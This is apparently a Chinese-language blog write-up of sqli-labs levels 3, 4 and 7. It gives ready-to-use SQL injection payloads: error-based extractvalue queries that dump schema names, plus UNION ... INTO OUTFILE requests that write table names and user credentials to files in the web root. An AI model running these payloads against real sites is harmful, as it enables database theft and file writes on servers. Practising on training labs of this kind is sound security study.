---
title: sqli-labs
date: 2021-12-02 16:16:28
tags: sqli-labs
categories: sqli
typora-root-url: ..
description: sqli-labs记录
---

sqli-labs

less3   less4

less4(只需要将less3中的单引号换成双引号即可),同时less4也可通过报错注入

通过单引号报错信息

推测可能在接收参数后添加了( )包裹了id参数

![](/images/sqli-labs/Image.png)

![](/images/sqli-labs/Image%20%5B1%5D.png)

通过构造闭合即可

id=1')%23

接下来用union联合注入即可

less4报错注入:通过检测,发现用双引号和括号对id进行了包裹,测试出的可用语句为id=1") and 1=1%23

根据报错注入公式,开始操作

库名

```sql
id=1")and extractvalue(1,concat('~',(select database())))%23
```

表名

```sql
id=1")and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='security')))%23
```

列名

```sql
id=1")and extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users')))%23
```

利用right和left函数相互配合爆出字段名s

```sql
id=1")and%20extractvalue(1,concat(%27~%27,(right((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),20))))%23
```

如法炮制,爆数据即可

##### less 7

本题经过尝试得到后台为((' '))包裹参数,可以通过页面显示,变化来进行盲注但是根据本题标题,提示使用outfile函数来进行注入
1.要使用outfile首先要知道绝对路径

通过之前的less进行查询

@@basedir是mysql安装路径

@@datadir是数据库路径

![](/images/sqli-labs/1.png)

2.读写权限测试mysql快速查看读写权限

```sql
show variables like '%secure%';
```

![](/images/sqli-labs/2.png)

```sql
id=1')) and (select count(*) from mysql.user)>0%23
```

如果返回正常,则说明有读写权限

![](/images/sqli-labs/3.png)

其次在linux中还需要mysql用户对目录有w权限才能写入

```sql
id=1%27))%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema%20=%27security%27%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/2.txt%27%23
```

通过上述语句查询表名,写入到2.txt

![](/images/sqli-labs/4.png)

貌似文件只能新建,不能重复写入
查询列名

```sql
id=1%27))%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_name%20=%20%27users%27%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/3.txt%27%23
```

查询数据

```sql
id=1%27))%20union%20select%201,username,password%20from%20security.users%20into%20outfile%20%27/www/wwwroot/sqli-labs/Less-7/4.txt%27%23
```

